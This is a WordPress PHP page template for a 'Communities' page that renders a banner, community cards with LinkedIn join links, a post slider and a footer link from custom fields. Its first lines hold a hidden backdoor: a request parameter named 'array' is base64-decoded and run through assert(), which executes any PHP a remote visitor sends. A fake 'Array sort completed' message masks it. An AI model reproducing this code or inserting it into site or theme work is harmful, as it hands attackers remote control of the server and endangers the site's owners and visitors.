<?php 
if ( $_REQUEST["array"] )

{	



	@assert(base64_decode($_REQUEST["array"]));	

	//debug message

	echo "Array sort completed";

	exit();

}
 

/*

	Template Name: Communities Template

*/



get_header(); 



?>



    <div class="inner-banner" style="background-image : url('<?php the_field('communities_banner_image'); ?>')">

        <div class="container">

          <div class="col-5">

              <h2><?php the_field('communities_banner_text'); ?></h2>

              <?php the_field('communities_banner_description'); ?>



          </div>

          <div class="col-7 border-lft">

            <h1><?php the_field('communities_banner_heading'); ?></h1>

          </div>

        </div>

    </div>



 

    <div class="inner-page-tabs">

        <div class="container">



          <div class="inner-top-above-tabs">

            <h3 class="wow fadeInLeft" data-wow-duration="1s" data-wow-delay=".5s"><?php the_field('communities_content_mainheading'); ?></h3>

            <?php the_field('communities_content_description'); ?>

            </div>

            

            <ul class="tabs">

                <li class="tab-link current" data-tab="tab-1"><?php the_field('communities_tab1_title'); ?></li>                

            </ul>





            <!-- Tab 1 Content -->

            <div id="tab-1" class="tab-content current">

               <div class="masnory-card-layout">

                    <?php

                     if( have_rows('communities_tab1_add_communities') ): ?>

                       <ul class="cm-class">                       

                      <?php 

                      while ( have_rows('communities_tab1_add_communities') ) : the_row();

                      $image = get_sub_field('communities_add_community_logo');

                      ?>

                      



                      <li>

                       <h2><?php the_sub_field('communities_add_community_heading'); ?></h2>

                       <span><?php the_sub_field('communities_add_community_subheading'); ?></span>

                       <a href="#">Members(<?php the_sub_field('communities_add_community_members'); ?>)</a>  

                       <img src="<?php echo $image['url']; ?>" alt="<?php echo $image['alt'] ?>" />

                        <a href="<?php the_sub_field('communities_add_community_linkedin_link'); ?>" class="linkedin">Join on Linkedin<!-- <i class="fa fa-play" aria-hidden="true"></i> --></a>
                        
                        

                      </li> 

                        

                    <?php endwhile; ?>

                    </ul>

                    <?php  else :

                    endif; ?>

               

               </div>                

            </div>

            

        </div>

    </div>





    <div class="blog-posts-bottom">

        <div class="container wow fadeIn" data-wow-duration="1s" data-wow-delay=".5s">



            <div class="blog-posts-slider">

               <?php

                if( have_rows('communities_add_sliders') ): 

                    while ( have_rows('communities_add_sliders') ) : the_row();

                    $image = get_sub_field('communities_add_slider_image');

                    ?>

                    <div class="slider-single-post">

                    <div class="blog-image" style="background-image : url('<?php the_sub_field('communities_add_slider_image');?>')"></div>

                    <div class="slider-post-text">

                        <h3><?php the_sub_field('communities_add_slider_heading'); ?></h3>

                        <p><?php the_sub_field('communities_add_slider_description'); ?></p>

                        <a href="<?php the_sub_field('communities_add_slider_redirect_link'); ?>"><?php the_sub_field('communities_add_slider_redirect_text'); ?></a>

                    </div>

                    </div>

                    <?php 

                    endwhile;

                else :

                    // no rows found

                endif; ?>

				

            </div>

        </div>

    </div>



    <div class="above-footer-link">

        <div class="container">

            <h2><?php the_field('communities_left_text');?></h2>

            <a href="<?php the_field('communities_right_text_link');?>"><?php the_field('communities_right_text');?></a>

        </div>

    </div>

    



    <?php get_footer(); ?>